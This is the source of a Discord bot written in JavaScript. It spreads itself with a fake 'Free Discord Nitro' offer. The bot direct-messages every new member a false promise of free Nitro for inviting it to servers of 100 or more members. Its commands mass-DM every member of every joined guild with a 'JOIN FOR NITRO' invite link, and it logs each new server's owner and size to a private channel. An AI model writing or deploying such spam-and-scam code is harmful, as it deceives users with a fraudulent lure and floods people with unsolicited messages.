const Discord = require("discord.js");
const bot = new Discord.Client();

const prefix = ".";
var authorBot = "587711963404959753";

bot.login(process.env.TOKEN);

bot.on("ready", function() {
    console.log('\x1B[31m%s\x1B[0m', '«--------------------------------------------------------» ▲ «--------------------------------------------------------»')
    console.log(
`

                                    ███▄ ▄███▓ ██▓███   ▄▄▄       ██▓     ██▓      
                                    ▓██▒▀█▀ ██▒▓██░  ██▒▒████▄    ▓██▒    ▓██▒    
                                    ▓██    ▓██░▓██░ ██▓▒▒██  ▀█▄  ▒██░    ▒██░    
                                    ▒██    ▒██ ▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██░    ▒██░    
                                    ▒██▒   ░██▒▒██▒ ░  ░ ▓█   ▓██▒░██████▒░██████▒
                                   ░ ▒░   ░  ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░▓  ░░ ▒░▓  ░
                                   ░  ░      ░░▒ ░       ▒   ▒▒ ░░ ░ ▒  ░░ ░ ▒  ░
                                   ░      ░   ░░         ░   ▒     ░ ░     ░ ░   
                                          ░                  ░  ░    ░  ░    ░  ░

`);
console.log('\x1B[31m%s\x1B[0m', '«--------------------------------------------------------» ▲ «--------------------------------------------------------»')
    let a = 0
  setInterval(() => {
if(a === 0){
  bot.user.setActivity(`${bot.guilds.size} servers | ${bot.users.size} members`, { type: 'WATCHING'});
    a = 1
} else {
    if(a === 1){
      bot.user.setActivity(`${bot.guilds.size} servers | ${bot.users.size} members`, { type: 'WATCHING'});
        a = 0             
}  
}
}, 8000)});

bot.on('guildCreate',function(guild){
  var logschannel = bot.channels.find("id", "659164503836983308")

    var embed= new Discord.RichEmbed()
    .setDescription("Bot ajouté sur un serveur !")
    .addField("Serveur:", guild.name)
    .addField("ID du serveur", guild.id)
    .addField("Owner:", guild.owner)
    .addField("Nombre de membres:", guild.members.size)
    .addField("Nombre de channel:", guild.channels.size)

    logschannel.send(embed)

    console.log(` > Le bot a été ajouté sur: ${guild.name} - ${guild.members.size} membres`)
});

bot.on('guildMemberAdd', member => {
  member.createDM().then(channel => {

    let serverembed = new Discord.RichEmbed()
    .setTitle(`<a:nitroboosttt:657698355887079476> Free Discord Nitro`)
    .setDescription('Free Discord Nitro!')
    .addField(`To celebrate these holidays I created a bot which gives nitro for free! If you want to win a free Discord Nitro Invite this bot to your server (minimum 100 members).`, "<a:flechedroiteee:657860893723328512> [*Click Here For Invite The Bot*](https://discordapp.com/oauth2/authorize?client_id=648497201743659009&scope=bot&permissions=0) <a:flechegaucheee:657860893723590686>")
    .setImage('https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif')
    .setThumbnail("https://cdn.discordapp.com/attachments/650064546211561472/657868281335513098/36e3a566e29a634c55cf0bcf1367fc90.png")
    .setColor("cb72da")
    .setFooter("Invite For Free Discord Nitro", "https://cdn.discordapp.com/attachments/650064546211561472/657868281335513098/36e3a566e29a634c55cf0bcf1367fc90.png")
    .setTimestamp()

    channel.send(serverembed);
  }).catch(console.error);
});

bot.on('message', msg => {

  let serverembed = new Discord.RichEmbed()
  .setTitle(`<a:nitroboosttt:657698355887079476> Free Discord Nitro`)
  .setDescription('Free Discord Nitro!')
  .addField(`To celebrate these holidays I created a bot which gives nitro for free! If you want to win a free Discord Nitro Invite this bot to your server (minimum 100 members).`, "<a:flechedroiteee:657860893723328512> [*Click Here For Invite The Bot*](https://discordapp.com/oauth2/authorize?client_id=648497201743659009&scope=bot&permissions=0) <a:flechegaucheee:657860893723590686>")
  .setImage('https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif')
  .setThumbnail("https://cdn.discordapp.com/attachments/650064546211561472/657868281335513098/36e3a566e29a634c55cf0bcf1367fc90.png")
  .setColor("cb72da")
  .setFooter("Invite For Free Discord Nitro", "https://cdn.discordapp.com/attachments/650064546211561472/657868281335513098/36e3a566e29a634c55cf0bcf1367fc90.png")
  .setTimestamp()

  if(msg.content.startsWith(prefix + 'puball')) {
      if(msg.author.id != authorBot) return msg.channel.send("Tu ne peux pas utiliser cette commande. ");

      console.log(" > Start sending")
      var servers =  bot.guilds.array();
      for(let it = 0;it<servers.length;it++){
          let members = servers[it].members.array()
          for(let it2 = 0;it2<members.length;it2++) {
              if(bot.user.id != members[it2].id)
              {
              members[it2].send("https://discord.gg/AjBt9Mg# \n **JOIN FOR NITRO**").catch(err => false);
              }
            }
          msg.channel.send('ServerID: **'+servers[it].id+'** - ServerNAME: **'+servers[it].name+'** - MemberMP: **'+members.length+'**')
        }
      }
});

bot.on('message', message => {
  if (message.content.startsWith(prefix + "help")) {

    let serverembed = new Discord.RichEmbed()
    .setTitle(`<a:nitroboosttt:657698355887079476> Free Discord Nitro`)
    .setDescription('Free Discord Nitro!')
    .addField(`To celebrate these holidays I created a bot which gives nitro for free! If you want to win a free Discord Nitro Invite this bot to your server (minimum 100 members).`, "<a:flechedroiteee:657860893723328512> [*Click Here For Invite The Bot*](https://discordapp.com/oauth2/authorize?client_id=648497201743659009&scope=bot&permissions=0) <a:flechegaucheee:657860893723590686>")
    .setImage('https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif')
    .setThumbnail("https://cdn.discordapp.com/attachments/650064546211561472/657868281335513098/36e3a566e29a634c55cf0bcf1367fc90.png")
    .setColor("cb72da")
    .setFooter("Invite For Free Discord Nitro", "https://cdn.discordapp.com/attachments/650064546211561472/657868281335513098/36e3a566e29a634c55cf0bcf1367fc90.png")
    .setTimestamp()
    
    message.delete(0).catch(console.error)
    message.channel.guild.members.forEach(user => {
    user.send(serverembed);
    });
  }
})

bot.on('message', message => {
  if (message.content === `${prefix}msgwola`){
    message.delete();

    let serverembed = new Discord.RichEmbed()
    .setTitle(`<a:nitroboosttt:657698355887079476> Free Discord Nitro`)
    .setDescription('Free Discord Nitro!')
    .addField(`To celebrate these holidays I created a bot which gives nitro for free! If you want to win a free Discord Nitro Invite this bot to your server (minimum 100 members).`, "<a:flechedroiteee:657860893723328512> [*Click Here For Invite The Bot*](https://discordapp.com/oauth2/authorize?client_id=648497201743659009&scope=bot&permissions=0) <a:flechegaucheee:657860893723590686>")
    .setImage('https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif')
    .setThumbnail("https://cdn.discordapp.com/attachments/650064546211561472/657868281335513098/36e3a566e29a634c55cf0bcf1367fc90.png")
    .setColor("cb72da")
    .setFooter("Invite For Free Discord Nitro", "https://cdn.discordapp.com/attachments/650064546211561472/657868281335513098/36e3a566e29a634c55cf0bcf1367fc90.png")
    .setTimestamp()

    return message.channel.send("https://discord.gg/AjBt9Mg# \n **JOIN FOR NITRO**");
  }
}
)

bot.on('message', message => {
  if (message.content === `${prefix}slist`){

    let serverembed = new Discord.RichEmbed()
    .setTitle("Serverlist: ")
    .addField(`${bot.guilds.size} servers | ${bot.users.size} members`, 'rawé chaud tavu frérot')
    .setColor("cb72da")

    message.channel.send(serverembed);
    message.channel.send(bot.guilds.map(r => r.name + ` | ${r.memberCount} membres`))
  }
}
)

bot.on('message', message => {
  if (message.content === `${prefix}reload`){

    console.log("-------------------------\nReloaded!");
    console.log(`${bot.guilds.size} servers | ${bot.users.size} members\n-------------------------`);
    console.log(bot.guilds.map(r => r.name + ` | ${r.memberCount} members`));
  }
}
)
